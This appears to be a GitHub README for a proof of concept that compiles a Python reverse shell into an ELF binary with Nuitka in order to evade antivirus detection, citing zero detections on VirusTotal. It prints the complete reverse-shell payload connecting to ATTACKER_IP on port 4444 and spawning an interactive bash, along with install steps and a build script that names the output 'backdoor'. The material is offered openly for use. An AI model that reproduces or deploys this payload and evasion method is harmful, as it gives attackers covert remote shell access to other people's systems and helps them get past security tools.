# 🛡️ Undetected ELF Payload (AV Bypass) via Python Compilation (Nuitka Only)

This proof-of-concept demonstrates a method to bypass antivirus detection on Linux by compiling a Python reverse shell into an ELF binary using [Nuitka](https://github.com/Nuitka/Nuitka). The compiled payload remains undetected by major antivirus engines, including on VirusTotal.

> 📌 CVE submission in progress.

---

## 🚀 Summary

- 💻 Payload: Python reverse shell
- ⚙️ Method: Python → ELF using Nuitka only
- 🧩 Obfuscation: No extra strip or packing applied
- 🛡️ Result: 0 detections on VirusTotal (at the time of testing)

---

## 📦 PoC Files

| File | Description |
|------|-------------|
| `payload.py` | Python reverse shell |
| `build.sh` | Simple build script using Nuitka |
| `dist/payload` | Final compiled ELF binary |
| `vt-scan.jpg` | VirusTotal scan result showing 0 detections |
| `backdoor` | The Backdoor in the virus total  sha256: df60a181ceba07d35350fb7d754f239685996b40ea24d155a82344f7fd52b651|

---

## 🧪 Tested Against

- ✅ VirusTotal (0/65 engines detected)
- ✅ Kaspersky Linux Endpoint
- ✅ ClamAV
- ✅ Windows Defender (via WSL)

---
## Proof of Concept

The following scan result shows no AV detected the compiled ELF:

![VirusTotal Scan](https://raw.githubusercontent.com/00xCanelo/ELF-AV-Bypass/refs/heads/main/vt-scan.png)

---
## 🔧 Build Instructions

```bash
sudo apt update
sudo apt install python3 python3-pip gcc g++ -y
pip3 install nuitka

# Compile the Python file into an ELF binary
bash build.sh
```
---
## 🐍 payload.py
```bash
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```
Replace ATTACKER_IP with your ip 
---
## 🔨 build.sh
```bash
#!/bin/bash

python -m nuitka --onefile --standalone --remove-output --output-filename=backdoor backdoor.py
mkdir -p dist
mv backdoor dist/payload
```

👤 Credits

Discovered and developed by:
Mohamed Aly (00xCanelo)
🔗 https://github.com/00xCanelo

